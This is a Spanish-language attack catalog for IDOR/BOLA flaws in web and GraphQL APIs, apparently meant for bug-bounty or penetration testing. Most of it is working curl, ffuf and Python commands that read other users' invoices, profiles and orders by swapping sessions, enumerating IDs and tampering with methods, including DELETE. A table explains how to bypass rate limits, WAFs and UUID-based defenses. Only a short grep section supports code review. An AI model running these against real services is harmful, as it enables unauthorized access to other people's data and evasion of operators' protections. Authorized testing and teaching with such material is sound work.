# IDOR/BOLA — Attack Surface Catalog

## URL patterns que lo delatan

```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params con IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

## Señales en JS source

```javascript
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
state.currentUser.organizationId   // redux/state store exponiendo IDs ajenos
```

## Señales de stack

- GraphQL (los IDOR por query se pisan menos que los REST)
- REST con IDs secuenciales enteros = más vulnerable
- UUIDs predecibles o leakeados en otras respuestas
- Multi-tenant con `org_id`/`account_id`/`business_id`
- Apps móviles — la API móvil suele saltarse checks que la web sí tiene

## Payloads y detección

**Swap de sesión básico:**
```bash
curl -s -H "Cookie: session=USER_A_SESSION" \
  https://target.com/api/v1/invoices/12345

curl -s -H "Cookie: session=USER_B_SESSION" \
  https://target.com/api/v1/invoices/12345
# éxito = 200 con data de A usando sesión de B
```

**GraphQL:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
```

**Enumeración secuencial con ffuf:**
```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 -ac \
  -o idor_results.json
```

**Wordlist de IDs alrededor de uno conocido:**
```python
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
```

**Method tampering:**
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

**Scraping de IDs leakeados en JS/respuestas:**
```bash
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

## Grep patterns para revisión de código fuente

```bash
# Missing ownership check en frameworks comunes
grep -rn "findById\|findOne\|getById" --include="*.js" .
grep -rn "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -rn "request\.args\.get\('id'\)" --include="*.py" .

# Query ORM sin scope de usuario
grep -rn "Model\.find(params" --include="*.js" .
# patrón seguro esperado: Model.find({ id: params.id, userId: req.user.id })
```

## Bypass techniques (defensa → cómo se rompe)

| Defensa | Bypass |
|---|---|
| UUIDs en vez de enteros | UUIDs leakean en otras respuestas/emails/webhooks/GraphQL/JS. Harvesteá y reemplazá. |
| Referencias hasheadas/indirectas | Suele ser base64 u obfuscación simple: `echo "dXNlcl8xMjM0NQ==" \| base64 -d` → `user_12345` |
| Tokens de un solo uso por recurso | A veces el server solo valida formato, no binding — probá tu propio token contra el ID ajeno |
| Rate limit en enumeración | Enumeración lenta (1 req/5s), IPs distribuidas, o explotar un IDOR no-enumerativo (ya tenés el ID de otra fuente) |
| `WHERE user_id = ?` en el query | Probá si el mismo endpoint existe en otra versión de API (`/v1/` vs `/v2/`) — la lógica de auth suele ser específica por versión |
| CORS restrictivo | Irrelevante — IDOR no necesita cross-origin, es tu propia sesión contra el endpoint directo |
| Sesiones server-side "opacas" | Buscá cualquier endpoint que devuelva el ID interno (headers `Location`, mensajes de error, metadata) |
| WAF/filtro de parámetros | Nested JSON `{"data":{"id":"VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, variaciones de nombre `user_id`/`userId`/`uid`/`account` |
